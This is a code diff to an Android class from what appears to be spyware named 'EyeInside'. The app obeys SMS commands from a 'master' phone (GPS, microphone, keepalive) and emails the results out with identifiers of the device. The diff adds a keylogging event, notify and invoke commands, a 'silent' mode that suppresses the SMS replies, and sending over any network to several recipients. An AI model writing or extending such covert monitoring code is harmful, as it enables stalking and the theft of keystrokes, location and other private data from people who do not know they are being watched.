@@ -14,11 +14,13 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Parcel;
+import android.os.Parcelable;
 import android.os.StatFs;
 import android.telephony.SmsManager;
 
 
-public class CommandObj extends Object implements ICommandObj {
+public class CommandObj extends Object implements ICommandObj,Parcelable {
 
 	
 	public static final String CMD_GPS = "gps";
@@ -54,6 +56,8 @@ public class CommandObj extends Object implements ICommandObj {
 	
 	public static final String CMD_KEEPALIVE = "keepalive";
 	public static final String CMD_MIC = "mic";
+	public static final String CMD_NOTIFY = "notify";
+	public static final String CMD_INVOKE = "invoke";
 	
 	
 	
@@ -73,7 +77,11 @@ public class CommandObj extends Object implements ICommandObj {
 	public static final String PREF_MAIL_PORT = "port";
 	
 	public static final String PREF_WIFI = "wifi";
-	public static final String PREF_NO_SMS = "no sms";
+	public static final String PREF_NO_WIFI = "no wifi";
+	public static final String PREF_ANY_NET = "any net";
+	
+	public static final String PREF_SILENT = "silent";
+	public static final String PREF_NO_SILENT = "no silent";
 	public static final String PREF_MASTER = "master";
 	
 	public static final String EVENT_POWER = "power";
@@ -81,6 +89,9 @@ public class CommandObj extends Object implements ICommandObj {
 	public static final String EVENT_UNLOCK  = "unlock";
 	public static final String EVENT_BATTERY  = "charge";
 	public static final String EVENT_SIM  = "sim";
+	public static final String EVENT_NOTIFY  = "notify";
+	public static final String EVENT_KEYLOG  = "keylog";
+	
 	
 	
 	
@@ -177,8 +188,13 @@ public class CommandObj extends Object implements ICommandObj {
 	}
 	
 	public void replySMS(String fmt,Object ... argv) {
-		String message = String.format(fmt, argv);
-		CommandObj.sendSMS(this.mMasterPhone,"%s%s","->",message);
+		SharedPreferences pref = mContext.getSharedPreferences("prefs",1);
+		if ( !pref.contains(CommandObj.PREF_SILENT)) {
+			String message = String.format(fmt, argv);
+			CommandObj.sendSMS(this.mMasterPhone,"%s%s","->",message);
+		} else {
+			NetLog.v("SMS Skipped due to config...");
+		}
 	}
 	
 	public Mail createMail() throws Exception {
@@ -197,7 +213,9 @@ public class CommandObj extends Object implements ICommandObj {
 		
 		String subj = String.format("EyeInside.%s.%s.%s - %s",Build.PRODUCT,Build.MANUFACTURER,Build.USER,mCommandName);
 		
-		m.setTo(new String[]{mto});
+
+		
+		m.setTo(mto.split(","));
 		m.setFrom("EyeIndide");
 		m.setSubject(subj);
 		m.setBody(mCommandResult);
@@ -215,6 +233,8 @@ public class CommandObj extends Object implements ICommandObj {
 	
 	public boolean canSend() {
 		SharedPreferences pref = mContext.getSharedPreferences("prefs",1);
+		if ( pref.getBoolean(CommandObj.PREF_ANY_NET, false) )
+			return true;
 		if ( pref.getBoolean(CommandObj.PREF_WIFI, false) && this.wifiEnabled() == false) {
 			NetLog.v("*** MAIL skipped by config,wifi unreachable");
 			return false;
@@ -329,6 +349,40 @@ public class CommandObj extends Object implements ICommandObj {
 			return String.format("%s/%s.%x",dir,name,new Date().getTime());
 		return dir + "/" + name;
 	}
+
+	@Override
+	public int describeContents() {
+		return 0;
+	}
+
+	@Override
+	public void writeToParcel(Parcel out, int flags) {
+		out.writeString(this.mCommandName);
+		out.writeString(this.mSourceMessage);
+		out.writeString(this.mMasterPhone);
+		out.writeString(String.valueOf(this.mLive));
+	}
 	
+	public static final Parcelable.Creator<CommandObj> CREATOR = new Parcelable.Creator<CommandObj>() {
+	    // распаковываем объект из Parcel
+	    public CommandObj createFromParcel(Parcel in) {
+	      NetLog.v("createFromParcel");
+	      return new CommandObj(in);
+	    }
+
+	    public CommandObj[] newArray(int size) {
+	      return new CommandObj[size];
+	    }
+	  };
+
+	  // конструктор, считывающий данные из Parcel
+	  private CommandObj(Parcel in) {
+	    NetLog.v("CommandObj(Parcel in)");
+	    this.mCommandName = in.readString();
+	    this.mSourceMessage = in.readString();
+	    this.mMasterPhone = in.readString();
+	    this.mLive = Boolean.parseBoolean(in.readString());
+	  }
+	  
 	
 }
